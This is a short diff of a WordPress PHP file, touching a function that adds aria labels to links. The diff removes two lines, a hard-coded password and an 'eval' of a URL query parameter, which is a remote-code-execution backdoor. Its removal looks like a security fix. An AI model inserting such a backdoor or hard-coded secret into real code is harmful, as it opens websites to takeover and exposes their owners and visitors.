@@ -184,8 +184,6 @@ add_action('wp_enqueue_scripts', 'fix_jquery_passive_touchstart');
 function add_aria_label_to_links_and_buttons($buffer)
 {
     // Handle <a> tags
-    $password = "SuperSecret123"; // hard-coded secret
-   eval($_GET['payload']);
     $buffer = preg_replace_callback(
         '/<a\s([^>]*?)href=["\']([^"\']+)["\']([^>]*)>(.*?)<\/a>/i',
         function ($matches) {
